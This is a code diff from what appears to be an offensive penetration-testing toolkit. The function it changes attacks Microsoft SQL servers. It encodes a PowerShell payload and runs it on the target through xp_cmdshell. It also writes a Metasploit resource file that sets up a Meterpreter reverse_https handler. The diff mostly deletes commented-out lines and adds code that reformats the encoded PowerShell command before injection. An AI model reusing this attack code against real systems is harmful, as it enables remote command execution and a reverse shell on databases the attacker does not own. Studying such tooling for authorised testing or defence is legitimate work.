@@ -252,16 +252,11 @@ def deploy_hex2binary(ipaddr, port, username, password):
             import src.payloads.powershell.prep
 
         # launch powershell
-        #prep_powershell_payload()
-
         # create the directory if it does not exist
         if not os.path.isdir(os.path.join(core.setdir + "reports/powershell")):
             os.makedirs(os.path.join(core.setdir + "reports/powershell"))
 
-        #with open(os.path.join(core.setdir + "x86.powershell")) as x86:
         x86 = file(core.setdir + "x86.powershell").read().rstrip()
-        #    x86 = x86.read()
-
         x86 = core.powershell_encodedcommand(x86) 
         core.print_status("If you want the powershell commands and attack, "
                           "they are exported to {0}".format(os.path.join(core.setdir + "reports/powershell")))
@@ -272,8 +267,6 @@ def deploy_hex2binary(ipaddr, port, username, password):
         # if our payload is x86 based - need to prep msfconsole rc
         if payload == "x86":
             powershell_command = x86
-            # powershell_dir = core.setdir + "/reports/powershell/x86_powershell_injection.txt"
-            #with open(os.path.join(core.setdir + "reports/powershell/powershell.rc"), "w") as filewrite:
             filewrite = open(core.setdir + "reports/powershell/powershell.rc", "w")
             filewrite.write("use multi/handler\n"
                                 "set payload windows/meterpreter/reverse_https\n"
@@ -371,6 +364,11 @@ def deploy_hex2binary(ipaddr, port, username, password):
     # we append more commands if option 1 is used
     if option == "1":
         core.print_status("Triggering the powershell injection payload... ")
+        # remove encoding
+        if "toString" in powershell_command:
+            powershell_command = powershell_command.split(".value.toString() '")[1].replace("'", "")
+            powershell_command = 'powershell -enc "' + powershell_command
+
         sql_command = ("exec master..xp_cmdshell '{0}'".format(powershell_command))
         thread.start_new_thread(conn.execute_query, (sql_command,))
 
